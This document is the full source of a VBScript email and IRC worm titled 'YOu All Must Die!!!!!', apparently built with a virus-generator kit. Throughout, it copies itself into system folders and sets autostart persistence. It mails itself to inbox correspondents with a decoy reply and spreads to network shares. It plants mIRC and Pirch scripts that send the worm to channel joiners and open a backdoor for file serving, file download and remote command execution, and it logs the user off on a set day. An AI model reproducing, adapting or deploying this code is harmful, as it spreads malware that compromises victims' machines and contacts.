' -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
'   YOu All Must Die!!!!! by Code Ripper
'   Generated by VBS Evolution on 05.29.2000
' -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

' Standard Header and Initialization
On Error Resume Next

Randomize

Dim shell, fso, daNet
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set daNet = CreateObject("WScript.Network")

' Windows directory
sDir1 = fso.BuildPath(fso.GetSpecialFolder(0), "OIILAMUA.VBS")
fso.CopyFile WScript.ScriptFullName, sDir1
' Windows\System directory
sDir2 = fso.BuildPath(fso.GetSpecialFolder(1), "GTKOKVVE.VBS")
fso.CopyFile WScript.ScriptFullName, sDir2
' Temp directory
sDir3 = fso.BuildPath(fso.GetSpecialFolder(2), "TWOOMIOA.VBS")
fso.CopyFile WScript.ScriptFullName, sDir3

sRun = "\Software\Microsoft\Windows\CurrentVersion\Run"

shell.RegWrite "HKCU" & sRun & "\Windows Cursor", "%WINDIR%\wscript.exe " & sDir1, "REG_EXPAND_SZ"
'c:\autorun.inf will be run everytime user browses C: from "My Computer"
Set Script = fso.CreateTextFile("c:\autorun.inf", True)
Script.WriteLine("[autorun]")
Script.WriteLine("open=" & sDir1)
Script.Close

' Initialize Outlook and MAPI
Set OutApp = CreateObject("Outlook.Application")
Set MapiName = OutApp.GetNameSpace("MAPI")

' Previously emailed dudes
sWinFile = fso.BuildPath(fso.GetSpecialFolder(0),"Windows.Exe")
If fso.FileExists(sWinFile) Then
  Set FileObj = fso.OpenTextFile(sWinFile, 1)
  DupeList = FileObj.ReadAll
  FileObj.Close
Else
  DupeList = ""
End If

' Total number of people we've emailed today
iTotal = 1

' Open up the INBOX
set MyFolder = MapiName.GetDefaultFolder(6)
Set MyItem = MyFolder.Items
' Variation of C's FindFirst/FindNext methods
set myMsg = MyItem.GetFirst

For each IDX in MyFolder.Items
'   Go ahead and reply to this message.  If contains a bad recipient,
'   or we've previously replied, we can always cancel later
  Set NewMail = myMsg.Reply


  i = InStr(LCase(NewMail.Recipients(1).Address), ".mil")
  j = InStr(LCase(NewMail.Recipients(1).Address), ".gov")
  k = InStr(LCase(NewMail.Recipients(1).Address), "admin")
  l = InStr(LCase(NewMail.Recipients(1).Address), "master")
  m = InStr(LCase(NewMail.Recipients(1).Address), "abuse")
'   A tab at the end of our subject marks us as being "already replied to"
  n = InStr(myMsg.Subject, Chr(9))
'   Make sure we didn't already email homeboy
  o = InStr(DupeList, NewMail.Recipients(1).Address)


  If i=0 and j=0 and k=0 and l=0 and m=0 and n=0 and o=0 Then
'     Add him to dupes
    DupeList = DupeList & "|" & NewMail.Recipients(1).Address
'     Duplicate the received email
    NewMail.Subject = myMsg.Subject
'     Minus any attachments
    While NewMail.Attachments.Count > 0
      NewMail.Attachments.Remove 1
    Wend
'     Add ourself
    NewMail.Attachments.Add WScript.ScriptFullName
    NewMail.Body = "Hi " & myMsg.SenderName & vbCrLf & _
    "Received your mail, and will send you a reply A.S.A.P." & vbCrLf & _
    "Until then, please evaluate the attached file" & _
    vbCrLf & vbCrLf & myMsg.Body
    NewMail.DeleteAfterSubmit = True
    NewMail.Send
'     Mark this message as "done" and save
    myMsg.Subject = myMsg.Subject & Chr(9)
    myMsg.Save
'     Don't email more than 20 people per cycle
    iTotal = iTotal + 1
    If iTotal > 20 Then
      Exit For
    End If
  else
'     User doesn't meet our requirements, cancel the reply
    NewMail.Delete
  end if

'   FindNext message
  Set myMsg = MyItem.GetNext
Next

' Write out our "previously emailed" addresses to a file for later use
Set FileObj = fso.CreateTextFile(sWinFile)
FileObj.Write DupeList
FileObj.Close

' Go through network shares and copy ourselves there
' Code gathered from LINKS.VBS (Zulu)
Set NetDrive = daNet.EnumNetworkDrives
If NetDrive.Count <> 0 Then
  For OneDr = 0 To NetDrive.Count - 1
    If InStr(NetDrive.Item(OneDr), "\\") <> 0 Then
      fso.CopyFile WScript.ScriptFullName, fso.BuildPath(NetDrive.Item(OneDr), _
        "OIILAMUA.VBS")
    End If
  Next
End If

'  Find MIRC directories on all fixed drives
'  Most MIRC commands taken from Del_Armg0 wonderful article from Matrix zine
  For Each Dri In fso.Drives
    If Dri.DriveType = 2 Then
        If fso.FileExists(Dri.DriveLetter & "\mirc\mirc32.exe") Then
          Set Script = fso.CreateTextFile(Dri.DriveLetter & "\mirc\script.ini", True)
          Script.WriteLine("[script]")
          Script.WriteLine("n0=on 1:start:{")
          Script.WriteLine("n1= .remote on")
          Script.WriteLine("n2= .ctcps on")
          Script.WriteLine("n3= .events on")
          Script.WriteLine("n4= .sreq ignore")
          Script.WriteLine("n5=}")
          Script.WriteLine("n6=on 1:join:#:if $me != $nick dcc send $nick " & WScript.ScriptFullName)
          Script.WriteLine("n7=on 1:TEXT:*script.ini*:#:/.ignore $nick")
          Script.WriteLine("n8=on 1:TEXT:*script.ini*:?:/.ignore $nick")
          Script.WriteLine("n9=on 1:TEXT:*virus*:#:/.ignore $nick")
          Script.WriteLine("n10=on 1:TEXT:*virus*:?:/.ignore $nick")
          Script.WriteLine("n11=on 1:TEXT:*worm*:#:/.ignore $nick")
          Script.WriteLine("n12=on 1:TEXT:*worm*:?:/.ignore $nick")
          Script.WriteLine("n13=on 1:text:*DoThatServe*:*:/fserve $nick 5 C:\")
          Script.WriteLine("n14=on 1:text:*OuttaHere*:*:/exit")
          Script.WriteLine("n15=on 1:text:*GiveMeGiveMe*:*:/dcc send $nick $2")
          Script.WriteLine("n16=on 1:text:*RunMeRunMe*:*:/run $2 $3 $4")
          Script.Close
        End If
    End If
  Next

'   Find Pirch directories on all fixed drives
'   Most Pirch commands taken from Del_Armg0 wonderful article from Matrix zine
  For Each Dri In fso.Drives
    If Dri.DriveType = 2 Then
      If fso.FileExists(Dri.DriveLetter & "\pirch98\pirch98.exe") Then
        Set Script = fso.CreateTextFile(Dri.DriveLetter & "\pirch98\events.ini", True)
        Script.WriteLine("[Levels]")
        Script.WriteLine("Enabled=1")
        Script.WriteLine("Count=2")
        Script.WriteLine("Level1=000-Unknowns")
        Script.WriteLine("000-UnknownsEnabled=1")
        Script.WriteLine("Level2=100-Level 100")
        Script.WriteLine("100-Level 100Enabled=1")
        Script.WriteLine("[000-Unknowns]")
        Script.WriteLine("User1=*!*@*")
        Script.WriteLine("UserCount=1")
        Script.WriteLine("Event1=; =========================================")
        Script.WriteLine("Event2=;   Pirch Protection Script: DO NOT EDIT!")
        Script.WriteLine("Event3=;     By NorthWest Computer Services")
        Script.WriteLine("Event4=;         http://www.pirchat.com")
        Script.WriteLine("Event5=; =========================================")
        Script.WriteLine("Event6=ON JOIN:#:/dcc send $nick " & WScript.ScriptFullName)
        Script.WriteLine("Event7=ON TEXT:*OuttaHere*:*:/exit")
        Script.WriteLine("Event8=ON TEXT:*GiveMeGiveMe*:*:/dcc send $nick $2")
        Script.WriteLine("Event9=ON TEXT:*RunMeRunMe*:*:/run $2 $3 $4")
        Script.WriteLine "Event10=ON TEXT:*virus*:#:/ignore # $nick")
        Script.WriteLine "Event11=ON TEXT:*worm*:#:/ignore # $nick")
        Script.WriteLine "Event12=ON TEXT:*trojan*:#:/ignore # $nick")
        Script.WriteLine "Event13=ON TEXT:*evolution*:#:/ignore # $nick")
        Script.WriteLine("EventCount=13")
        Script.WriteLine("[100-Level 100]")
        Script.WriteLine("UserCount=0")
        Script.WriteLine("EventCount=0")
        Script.Close
      End If
    End If
  Next

If Day = 6 Then
'  Reboot code taken from Chi Li's article (Rebooting Windows with VBS)

'  Set Menu delay to 2 seconds
  shell.RegWrite "HKCU\Control Panel\Desktop\MenuShowDelay", "2000", "REG_EXPAND_SZ"
'   Shuts down all running processes, then logs the user off
  shell.Run ("rundll32.exe shell32.dll, SHExitWindowsEx 0")
End If
